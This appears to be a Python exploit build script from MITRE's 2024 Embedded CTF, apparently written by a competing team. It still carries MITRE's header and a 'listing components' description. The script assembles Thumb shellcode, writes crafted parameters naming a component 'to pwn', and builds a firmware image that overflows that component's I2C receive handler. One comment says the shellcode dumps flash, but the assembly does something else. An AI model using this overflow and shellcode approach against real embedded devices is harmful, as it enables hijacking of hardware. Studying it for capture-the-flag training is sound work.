# @file list_tool.py
# @author Frederich Stine
# @brief host tool for listing installed components 
# @date 2024
#
# This source file is part of an example system for MITRE's 2024 Embedded CTF (eCTF).
# This code is being provided only for educational purposes for the 2024 MITRE eCTF
# competition, and may not meet MITRE standards for quality. Use this code at your
# own risk!
#
# @copyright Copyright (c) 2024 The MITRE Corporation

import argparse
import sys
import os
import subprocess
from pwn import *

# returns the shellcode to run on the component
# this shellcode by default dumps the contents of flash to the uart
def construct_shellcode():
    # if a partial dump occurs, modify this to get the rest
    # TODO: make this cli argument
    start_offset = 0
    # start_offset = 70 * 1024

    # address we will read from
    start_dump_addr = 0x1000e000 + start_offset
    # amount of bytes we will print out
    dump_length = 0x00038000 - start_offset

    i2c_base = 0x4001e000
    i2c_status = i2c_base + 0x4
    i2c_flags0 = i2c_base + 0x8
    i2c_inten0 = i2c_base + 0xc
    i2c_fifo = i2c_base + 0x2c
    i2c_txctrl0 = i2c_base + 0x24
    i2c_slave_control = i2c_base + 0x4c

    flags_wr_addr_match = 1 << 23
    flags_tx_lockout = 1 << 15

    reg_write = f'''
        nop

        @ disable interrupts for i2c
        ldr r0, ={hex(i2c_inten0)}
        mov r1, #0
        str r1, [r0]

        @ change slave i2c address
        @ TODO: figure out if this works while controller enabled
        ldr r0, ={hex(i2c_slave_control)}
        mov r1, #0x25
        str r1, [r0]

        @ infinite loop, no i2c messages sent
        nop_loop:
        b nop_loop

        nop
    '''

    shellcode = asm(reg_write, arch="thumb")
    assert len(shellcode) < 256

    print(shellcode)
    print(disasm(shellcode, arch='thumb'))

    return shellcode

PAGE_SIZE = 8192

APP_PAGES = 28
TOTAL_SIZE = APP_PAGES * PAGE_SIZE

"""
Package a device image for use with the bootstrapper
"""
def package_binary(bin_path, image_path):

    # Read input binaries
    with open(bin_path, "rb") as fp:
        bl_data = fp.read()

    # Pad bootloader to max size
    image_bl_pad_len = TOTAL_SIZE - len(bl_data)
    image_bl_padding = b"\xff" * image_bl_pad_len
    image_bl_data = bl_data + image_bl_padding

    # Write output binary
    with open(image_path, "wb") as fp:
        fp.write(image_bl_data)

def build(args):
    # cd to directory of this script
    dir = os.path.dirname(os.path.realpath(sys.argv[0]))
    os.chdir(dir)

    shellcode = construct_shellcode()
    # shellcode in the form of array notation
    shellcode_arr = '[' + ','.join(str(byte) for byte in shellcode) + ']'
    print(shellcode_arr)

    with open("application_processor/inc/ectf_params.h", "w") as f:
        f.write("#ifndef __ECTF_PARAMS__\n")
        f.write("#define __ECTF_PARAMS__\n")
        f.write(f"#define AP_PIN \"123456\"\n")
        f.write(f"#define AP_TOKEN \"1234567890abcdef\"\n")
        # first id in this list will be id to pwn
        f.write(f"#define COMPONENT_IDS {args.component}, 0x11111126\n")
        f.write(f"#define COMPONENT_CNT 2\n")
        f.write(f"#define AP_BOOT_MSG \"hi\"\n")
        f.write("#endif\n")

    output_name = args.output
    output_dir = os.path.abspath('.')
    output_elf = f"{output_dir}/{output_name}.elf"
    output_bin = f"{output_dir}/{output_name}.bin"
    output_img = f"{output_dir}/{output_name}.img"

    if os.path.exists(output_elf):
        os.remove(output_elf)
    if os.path.exists(output_bin):
        os.remove(output_bin)
    if os.path.exists(output_img):
        os.remove(output_img)

    os.environ['RECV_DONE_ADDRESS'] = args.done_address
    os.environ['WRITE_LEN'] = args.write_len
    os.environ['SHELLCODE'] = shellcode_arr

    output = subprocess.check_output([
        '/bin/sh',
        '-c',
        f'pwd && echo && nix-shell --command "cd application_processor && make clean && make && make release && cp build/max78000.elf {output_elf} && cp build/max78000.bin {output_bin}"'
    ])

    print(output)

    if not os.path.exists(output_bin):
        print("Error: tool did not build properly")
        exit(1)

    print("Built application processor")

    print("Packaging binary")
    package_binary(output_bin, output_img)
    print("Binary packaged")


# Main function
def main():
    parser = argparse.ArgumentParser(
        prog="b01lers i2c supply chain build",
        description="exploit the bug in the component i2c handler on the supply chain scenario",
    )

    parser.add_argument(
        "-o", "--output", required=True, help="Output file of built image"
    )

    parser.add_argument(
        "-c", "--component", required=True, help="Component ID of component to pwn"
    )

    parser.add_argument(
        "-r", "--done-address", default="0x20000b34", help="Address of the recieve done buffer (on reference design this is 0x20000b34)"
    )

    parser.add_argument(
        "-l", "--write-len", default="0x1000", help="Number of bytes to overflow i2c with"
    )

    args = parser.parse_args()

    build(args)


if __name__ == "__main__":
    main()

